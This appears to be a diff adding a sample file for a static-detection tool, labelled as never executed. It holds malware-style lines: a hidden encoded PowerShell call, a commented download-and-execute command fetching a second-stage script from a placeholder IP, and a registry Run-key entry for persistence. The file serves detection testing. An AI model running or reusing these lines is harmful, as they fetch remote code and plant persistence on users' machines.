@@ -1,0 +1,4 @@
+REM Harmless text sample: these lines are never executed by ARGUS. It only shows what static rules look for.
+powershell -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABzAGEAbQBwAGwAZQA=
+rem (New-Object Net.WebClient).DownloadString('http://203.0.113.66:8081/stage2.ps1') | IEX
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\Public\u.exe
